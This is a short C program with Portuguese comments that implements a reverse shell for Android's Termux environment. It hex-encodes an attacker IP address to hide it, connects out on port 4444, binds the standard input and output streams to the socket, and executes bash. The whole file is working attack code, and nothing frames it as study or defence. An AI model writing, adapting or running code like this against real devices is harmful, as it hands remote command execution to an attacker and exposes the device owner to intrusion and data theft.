#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/socket.h>

int main() {
    const char *a = "\x31\x39\x32\x2e\x31\x36\x38\x2e\x32\x32\x36\x2e\x31\x33\x36"; // "192.168.226.136"
    short b = 0x115C; // 4444

    int c;
    struct sockaddr_in d;

    // Criar socket
    c = socket(AF_INET, SOCK_STREAM, 0);
    if (c < 0) {
        perror("Erro ao criar o socket");
        exit(1);
    }

    d.sin_family = AF_INET;
    d.sin_port = htons(b);
    d.sin_addr.s_addr = inet_addr(a);

    // Tentar conectar ao servidor
    if (connect(c, (struct sockaddr*)&d, sizeof(d)) < 0) {
        perror("Erro ao conectar ao servidor");
        close(c);
        exit(1);
    }

    // Redirecionar stdin, stdout, stderr para o socket
    for (int i = 0; i < 3; i++) {
        dup2(c, i);
    }

    // Alterar o caminho do shell para o Termux
    char *const e[] = {"/data/data/com.termux/files/usr/bin/bash", NULL};
    execve(e[0], e, NULL);

    // Fechar socket
    close(c);
    return 0;
}

